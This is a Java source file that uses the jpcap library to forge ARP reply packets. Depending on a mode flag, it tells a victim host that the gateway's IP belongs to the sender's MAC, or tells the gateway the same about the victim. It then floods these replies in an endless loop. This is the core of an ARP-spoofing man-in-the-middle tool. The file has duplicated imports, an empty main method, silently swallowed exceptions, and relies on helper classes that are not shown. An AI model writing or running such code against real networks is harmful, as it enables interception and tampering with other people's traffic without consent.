import jpcap.JpcapCaptor;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
import jpcap.NetworkInterface;
import jpcap.packet.Packet;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
public class reply extends Thread {
int count;
String ipp;
String mac;
NetworkInterface dev;

public reply(String macc,String ip,int c,NetworkInterface devv)
{
 dev=devv;
 count=c;
 ipp=ip;
 mac=macc;

this.start();
}
public  void run()

{



try{

 
JpcapCaptor captor=JpcapCaptor.openDevice(dev, 2000, false, 3000);
            
   
        captor.setFilter("arp", true);
        JpcapSender sender=captor.getJpcapSenderInstance();
 ARPPacket arp = new ARPPacket();
        arp.hardtype=ARPPacket.HARDTYPE_ETHER;
        arp.prototype=ARPPacket.PROTOTYPE_IP;
        arp.operation=ARPPacket.ARP_REPLY;
        arp.hlen=6;
        arp.plen=4;
        arp.sender_hardaddr=dev.mac_address;
        if(count==1)
        {
     
        arp.sender_protoaddr=InetAddress.getByName(mask.ip_gw).getAddress();
         System.out.println("mask.ip_gw"+mask.ip_gw);
         
          
        arp.target_hardaddr=tab_mac.get_mac_byte(mac );
        arp.target_protoaddr=InetAddress.getByName(ipp).getAddress();
 
        EthernetPacket ether = new EthernetPacket();
        ether.frametype=EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac=dev.mac_address;
        ether.dst_mac=tab_mac.get_mac_byte(mac);
        arp.datalink=ether;
        }
        if(count==2)
        {    
        arp.sender_protoaddr=InetAddress.getByName(ipp).getAddress();
 
         
          
        arp.target_hardaddr=tab_mac.get_mac_byte(mask.mac_gw);
        arp.target_protoaddr=InetAddress.getByName(mask.ip_gw).getAddress();
 
        EthernetPacket ether = new EthernetPacket();
        ether.frametype=EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac=dev.mac_address;
        ether.dst_mac=tab_mac.get_mac_byte(mask.mac_gw);
        arp.datalink=ether;
        }   


       while(true){
       
       sender.sendPacket(arp);
 
       
}
        }
       

catch(Exception E)
{

}


}
public static void main(String []args)
{

























}
}